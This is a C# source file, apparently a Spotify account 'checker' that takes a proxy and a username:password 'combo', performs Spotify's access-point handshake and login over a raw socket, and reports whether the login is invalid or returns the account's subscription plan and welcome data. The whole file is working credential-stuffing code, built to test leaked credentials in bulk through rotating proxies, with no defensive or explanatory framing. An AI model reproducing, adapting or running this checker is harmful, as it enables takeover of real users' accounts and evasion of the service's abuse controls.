using java.util.concurrent.atomic;
using Leaf.xNet;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Threading;

namespace ConsoleApp1
{
    internal class blala
    {

        public static TcpClient ProxyTcpClient(string targetHost, int targetPort, string httpProxyHost, int httpProxyPort)
        {
            try
            {
                const BindingFlags Flags = BindingFlags.NonPublic | BindingFlags.Instance;
                Uri proxyUri = new UriBuilder
                {
                    Scheme = Uri.UriSchemeHttp,
                    Host = httpProxyHost,
                    Port = httpProxyPort
                }.Uri;
                Uri targetUri = new UriBuilder
                {
                    Scheme = Uri.UriSchemeHttp,
                    Host = targetHost,
                    Port = targetPort
                }.Uri;

                WebProxy webProxy = new WebProxy(proxyUri, true);
                WebRequest request = WebRequest.Create(targetUri);
                request.Proxy = webProxy;
                request.Method = "CONNECT";
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                Type responseType = responseStream.GetType();
                PropertyInfo connectionProperty = responseType.GetProperty("Connection", Flags);
                var connection = connectionProperty.GetValue(responseStream, null);
                Type connectionType = connection.GetType();
                PropertyInfo networkStreamProperty = connectionType.GetProperty("NetworkStream", Flags);
                NetworkStream networkStream = (NetworkStream)networkStreamProperty.GetValue(connection, null);
                Type nsType = networkStream.GetType();
                PropertyInfo socketProperty = nsType.GetProperty("Socket", Flags);
                Socket socket = (Socket)socketProperty.GetValue(networkStream, null);
                return new TcpClient { Client = socket };
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public static byte[] serverKey = new byte[]{
            (byte) 0xac, (byte) 0xe0, (byte) 0x46, (byte) 0x0b, (byte) 0xff, (byte) 0xc2, (byte) 0x30, (byte) 0xaf, (byte) 0xf4, (byte) 0x6b, (byte) 0xfe, (byte) 0xc3,
            (byte) 0xbf, (byte) 0xbf, (byte) 0x86, (byte) 0x3d, (byte) 0xa1, (byte) 0x91, (byte) 0xc6, (byte) 0xcc, (byte) 0x33, (byte) 0x6c, (byte) 0x93, (byte) 0xa1,
            (byte) 0x4f, (byte) 0xb3, (byte) 0xb0, (byte) 0x16, (byte) 0x12, (byte) 0xac, (byte) 0xac, (byte) 0x6a, (byte) 0xf1, (byte) 0x80, (byte) 0xe7, (byte) 0xf6,
            (byte) 0x14, (byte) 0xd9, (byte) 0x42, (byte) 0x9d, (byte) 0xbe, (byte) 0x2e, (byte) 0x34, (byte) 0x66, (byte) 0x43, (byte) 0xe3, (byte) 0x62, (byte) 0xd2,
            (byte) 0x32, (byte) 0x7a, (byte) 0x1a, (byte) 0x0d, (byte) 0x92, (byte) 0x3b, (byte) 0xae, (byte) 0xdd, (byte) 0x14, (byte) 0x02, (byte) 0xb1, (byte) 0x81,
            (byte) 0x55, (byte) 0x05, (byte) 0x61, (byte) 0x04, (byte) 0xd5, (byte) 0x2c, (byte) 0x96, (byte) 0xa4, (byte) 0x4c, (byte) 0x1e, (byte) 0xcc, (byte) 0x02,
            (byte) 0x4a, (byte) 0xd4, (byte) 0xb2, (byte) 0x0c, (byte) 0x00, (byte) 0x1f, (byte) 0x17, (byte) 0xed, (byte) 0xc2, (byte) 0x2f, (byte) 0xc4, (byte) 0x35,
            (byte) 0x21, (byte) 0xc8, (byte) 0xf0, (byte) 0xcb, (byte) 0xae, (byte) 0xd2, (byte) 0xad, (byte) 0xd7, (byte) 0x2b, (byte) 0x0f, (byte) 0x9d, (byte) 0xb3,
            (byte) 0xc5, (byte) 0x32, (byte) 0x1a, (byte) 0x2a, (byte) 0xfe, (byte) 0x59, (byte) 0xf3, (byte) 0x5a, (byte) 0x0d, (byte) 0xac, (byte) 0x68, (byte) 0xf1,
            (byte) 0xfa, (byte) 0x62, (byte) 0x1e, (byte) 0xfb, (byte) 0x2c, (byte) 0x8d, (byte) 0x0c, (byte) 0xb7, (byte) 0x39, (byte) 0x2d, (byte) 0x92, (byte) 0x47,
            (byte) 0xe3, (byte) 0xd7, (byte) 0x35, (byte) 0x1a, (byte) 0x6d, (byte) 0xbd, (byte) 0x24, (byte) 0xc2, (byte) 0xae, (byte) 0x25, (byte) 0x5b, (byte) 0x88,
            (byte) 0xff, (byte) 0xab, (byte) 0x73, (byte) 0x29, (byte) 0x8a, (byte) 0x0b, (byte) 0xcc, (byte) 0xcd, (byte) 0x0c, (byte) 0x58, (byte) 0x67, (byte) 0x31,
            (byte) 0x89, (byte) 0xe8, (byte) 0xbd, (byte) 0x34, (byte) 0x80, (byte) 0x78, (byte) 0x4a, (byte) 0x5f, (byte) 0xc9, (byte) 0x6b, (byte) 0x89, (byte) 0x9d,
            (byte) 0x95, (byte) 0x6b, (byte) 0xfc, (byte) 0x86, (byte) 0xd7, (byte) 0x4f, (byte) 0x33, (byte) 0xa6, (byte) 0x78, (byte) 0x17, (byte) 0x96, (byte) 0xc9,
            (byte) 0xc3, (byte) 0x2d, (byte) 0x0d, (byte) 0x32, (byte) 0xa5, (byte) 0xab, (byte) 0xcd, (byte) 0x05, (byte) 0x27, (byte) 0xe2, (byte) 0xf7, (byte) 0x10,
            (byte) 0xa3, (byte) 0x96, (byte) 0x13, (byte) 0xc4, (byte) 0x2f, (byte) 0x99, (byte) 0xc0, (byte) 0x27, (byte) 0xbf, (byte) 0xed, (byte) 0x04, (byte) 0x9c,
            (byte) 0x3c, (byte) 0x27, (byte) 0x58, (byte) 0x04, (byte) 0xb6, (byte) 0xb2, (byte) 0x19, (byte) 0xf9, (byte) 0xc1, (byte) 0x2f, (byte) 0x02, (byte) 0xe9,
            (byte) 0x48, (byte) 0x63, (byte) 0xec, (byte) 0xa1, (byte) 0xb6, (byte) 0x42, (byte) 0xa0, (byte) 0x9d, (byte) 0x48, (byte) 0x25, (byte) 0xf8, (byte) 0xb3,
            (byte) 0x9d, (byte) 0xd0, (byte) 0xe8, (byte) 0x6a, (byte) 0xf9, (byte) 0x48, (byte) 0x4d, (byte) 0xa1, (byte) 0xc2, (byte) 0xba, (byte) 0x86, (byte) 0x30,
            (byte) 0x42, (byte) 0xea, (byte) 0x9d, (byte) 0xb3, (byte) 0x08, (byte) 0x6c, (byte) 0x19, (byte) 0x0e, (byte) 0x48, (byte) 0xb3, (byte) 0x9d, (byte) 0x66,
            (byte) 0xeb, (byte) 0x00, (byte) 0x06, (byte) 0xa2, (byte) 0x5a, (byte) 0xee, (byte) 0xa1, (byte) 0x1b, (byte) 0x13, (byte) 0x87, (byte) 0x3c, (byte) 0xd7,
            (byte) 0x19, (byte) 0xe6, (byte) 0x55, (byte) 0xbd
    };

        public static string check(string proxy, string combo)
        {
            try
            {
                HttpRequest vlient = new HttpRequest();
                JArray lol =
                    JArray.Parse(
                        JObject.Parse(vlient.Get("http://apresolve.spotify.com/?type=accesspoint").ToString())[
                            "accesspoint"].ToString());
                TcpClient clinet = null;
                Random random = new Random();

                string host = lol[random.Next(0, lol.Count)].ToString();

                if (proxy == "null")
                {
                    clinet = new TcpClient(host.Split(':')[0], int.Parse(host.Split(':')[1]));
                }
                else
                {
                    clinet = ProxyTcpClient(host.Split(':')[0], int.Parse(host.Split(':')[1]), proxy.Split(':')[0], int.Parse(proxy.Split(':')[1]));
                }
                //clinet = new TcpClient(host.Split(':')[0], int.Parse(host.Split(':')[1]));
                if (clinet == null)
                {
                    return "error";
                }

                clinet.ReceiveTimeout = 4000;
                clinet.SendTimeout = 4000;
                com.JB.crypto.DiffieHellman keys = new com.JB.crypto.DiffieHellman(new java.util.Random());
                byte[] clientHello = com.JB.core.Session.clientHello(keys);
                Accumulator acc = new Accumulator();

                var a = clinet.GetStream();
                a.WriteByte(0x00);
                a.WriteByte(0x04);
                a.WriteByte(0x00);
                a.WriteByte(0x00);
                a.WriteByte(0x00);
                a.Flush();
                int lenght = 2 + 4 + clientHello.Length;
                byte[] bytes = BitConverter.GetBytes(lenght);
                a.WriteByte(bytes[0]);
                a.Write(clientHello, 0, clientHello.Length);
                a.Flush();
                Byte[] buffer = new byte[1000];
                int len = int.Parse(a.Read(buffer, 0, buffer.Length).ToString());
                byte[] tmp = new byte[len];
                Array.Copy(buffer, tmp, len);

                tmp = tmp.Skip(4).ToArray();

                acc.writeByte(0x00);
                acc.writeByte(0x04);
                acc.writeInt(lenght);
                acc.write(clientHello);
                acc.writeInt(len);
                acc.write(tmp);
                acc.dump();

                com.spotify.Keyexchange.APResponseMessage apResponseMessage =
                    com.spotify.Keyexchange.APResponseMessage.parseFrom(tmp);
                byte[] sharedKey = com.JB.common.Utils.toByteArray(keys.computeSharedKey(apResponseMessage
                    .getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGs().toByteArray()));

                java.security.KeyFactory factory = java.security.KeyFactory.getInstance("RSA");
                java.security.PublicKey publicKey = factory.generatePublic(
                    new java.security.spec.RSAPublicKeySpec(new java.math.BigInteger(1, com.JB.core.Session.serverKey),
                        java.math.BigInteger.valueOf(65537)));
                java.security.Signature sig = java.security.Signature.getInstance("SHA1withRSA");
                sig.initVerify(publicKey);
                sig.update(apResponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGs()
                    .toByteArray());
                sig.verify(apResponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman()
                    .getGsSignature().toByteArray());

                java.io.ByteArrayOutputStream data = new java.io.ByteArrayOutputStream(100);

                javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA1");
                mac.init(new javax.crypto.spec.SecretKeySpec(sharedKey, "HmacSHA1"));
                for (int i = 1; i < 6; i++)
                {
                    mac.update(acc.array());
                    mac.update(new byte[] {(byte) i});
                    data.write(mac.doFinal());
                    mac.reset();
                }

                byte[] dataArray = data.toByteArray();
                mac = javax.crypto.Mac.getInstance("HmacSHA1");
                mac.init(new javax.crypto.spec.SecretKeySpec(java.util.Arrays.copyOfRange(dataArray, 0, 0x14),
                    "HmacSHA1"));
                mac.update(acc.array());
                byte[] challenge = mac.doFinal();

                com.spotify.Keyexchange.ClientResponsePlaintext clientResponsePlaintext = com.spotify.Keyexchange
                    .ClientResponsePlaintext.newBuilder()
                    .setLoginCryptoResponse(com.spotify.Keyexchange.LoginCryptoResponseUnion.newBuilder()
                        .setDiffieHellman(com.spotify.Keyexchange.LoginCryptoDiffieHellmanResponse.newBuilder()
                            .setHmac(com.google.protobuf.ByteString.copyFrom(challenge)).build())
                        .build())
                    .setPowResponse(com.spotify.Keyexchange.PoWResponseUnion.newBuilder().build())
                    .setCryptoResponse(com.spotify.Keyexchange.CryptoResponseUnion.newBuilder().build())
                    .build();

                byte[] clientResponsePlaintextBytes = clientResponsePlaintext.toByteArray();
                len = 4 + clientResponsePlaintextBytes.Length;
                a.WriteByte(0x00);
                a.WriteByte(0x00);
                a.WriteByte(0x00);
                byte[] bytesb = BitConverter.GetBytes(len);
                a.WriteByte(bytesb[0]);
                a.Write(clientResponsePlaintextBytes, 0, clientResponsePlaintextBytes.Length);
                a.Flush();

                com.spotify.Authentication.LoginCredentials loginCredentials = com.spotify.Authentication
                    .LoginCredentials.newBuilder()
                    .setUsername(combo.Split(':')[0])
                    .setTyp(com.spotify.Authentication.AuthenticationType.AUTHENTICATION_USER_PASS)
                    .setAuthData(com.google.protobuf.ByteString.copyFromUtf8(combo.Split(':')[1]))
                    .build();

                com.spotify.Authentication.ClientResponseEncrypted clientResponseEncrypted = com.spotify.Authentication
                    .ClientResponseEncrypted.newBuilder()
                    .setLoginCredentials(loginCredentials)
                    .setSystemInfo(com.spotify.Authentication.SystemInfo.newBuilder()
                        .setOs(com.spotify.Authentication.Os.OS_UNKNOWN)
                        .setCpuFamily(com.spotify.Authentication.CpuFamily.CPU_UNKNOWN)
                        .setSystemInformationString(com.JB.Version.systemInfoString())
                        .setDeviceId(com.JB.common.Utils.randomHexString(new java.util.Random(), 30))
                        .build())
                    .setVersionString(com.JB.Version.versionString())
                    .build();

                com.JB.crypto.Shannon sendCipher = new com.JB.crypto.Shannon();
                sendCipher.key(java.util.Arrays.copyOfRange(data.toByteArray(), 0x14, 0x34));
                AtomicInteger sendNonce = new AtomicInteger(0);

                com.JB.crypto.Shannon recvCipher = new com.JB.crypto.Shannon();
                recvCipher.key(java.util.Arrays.copyOfRange(data.toByteArray(), 0x34, 0x54));
                AtomicInteger recvNonce = new AtomicInteger(0);
                sendCipher.nonce(com.JB.common.Utils.toByteArray(sendNonce.getAndIncrement()));

                java.nio.ByteBuffer buffer2 =
                    java.nio.ByteBuffer.allocate(1 + 2 + clientResponseEncrypted.toByteArray().Length);
                buffer2.put(com.JB.crypto.Packet.Type.Login.val)
                    .putShort((short) clientResponseEncrypted.toByteArray().Length)
                    .put(clientResponseEncrypted.toByteArray());

                byte[] bytess = buffer2.array();
                sendCipher.encrypt(bytess);
                byte[] macc = new byte[4];
                sendCipher.finish(macc);
                a.Write(bytess, 0, bytess.Length);
                a.Write(macc, 0, macc.Length);
                a.Flush();
                recvCipher.nonce(com.JB.common.Utils.toByteArray(recvNonce.getAndIncrement()));

                byte[] headerBytes = new byte[3];
                a.Read(headerBytes, 0, 3);
                recvCipher.decrypt(headerBytes);

                short payloadLength = (short) ((headerBytes[1] << 8) | (headerBytes[2] & 0xFF));
                byte[] payloadBytes = new byte[payloadLength];
                a.Read(payloadBytes, 0, payloadBytes.Length);
                recvCipher.decrypt(payloadBytes);

                byte[] maccc = new byte[4];
                a.Read(maccc, 0, maccc.Length);
                if (headerBytes[0] == 172)
                {
                    com.spotify.Authentication.APWelcome apWelcome = com.spotify.Authentication.APWelcome.parseFrom(payloadBytes);

                    int i = 0;
                    string lel = "";
                    string lel2 = "";
                    while (true)
                    {
                        recvCipher.nonce(com.JB.common.Utils.toByteArray(recvNonce.getAndIncrement()));

                        headerBytes = new byte[3];
                        a.Read(headerBytes, 0, 3);
                        recvCipher.decrypt(headerBytes);

                        payloadLength = (short) ((headerBytes[1] << 8) | (headerBytes[2] & 0xFF));
                        payloadBytes = new byte[payloadLength];
                        a.Read(payloadBytes, 0, payloadBytes.Length);
                        Thread.Sleep(10);
                        recvCipher.decrypt(payloadBytes);
                        maccc = new byte[4];
                        a.Read(maccc, 0, maccc.Length);

                        //File.WriteAllBytes(headerBytes[0]+".txt",payloadBytes);
                        if (headerBytes[0] == 27)
                        {
                            System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
                            lel2 = enc.GetString(payloadBytes);
                            i++;
                        }
                        if (headerBytes[0] == 80)
                        {
                            Console.WriteLine(com.JB.core.Session.parse(payloadBytes).get("financial-product").ToString());
                            lel = com.JB.core.Session.parse(payloadBytes).get("financial-product").ToString();
                            i++;
                        }

                        if (i >= 2)
                        {
                            return lel + "-lol-" + apWelcome + "-lol-" + lel2;
                        }
                    }
                }
                else if (headerBytes[0] == 173)
                {
                    return "invalid";
                }
            }
            catch (Exception ex)
            {
                return "error";
            }

            return "error";
        }

        public class Accumulator : java.io.DataOutputStream
        {
            private byte[] bytes;

            internal Accumulator() : base(new java.io.ByteArrayOutputStream())
            {
            }

            internal virtual void dump()
            {
                bytes = ((java.io.ByteArrayOutputStream)this.@out).toByteArray();
                this.close();
            }

            internal virtual byte[] array()
            {
                return bytes;
            }
        }
    }
}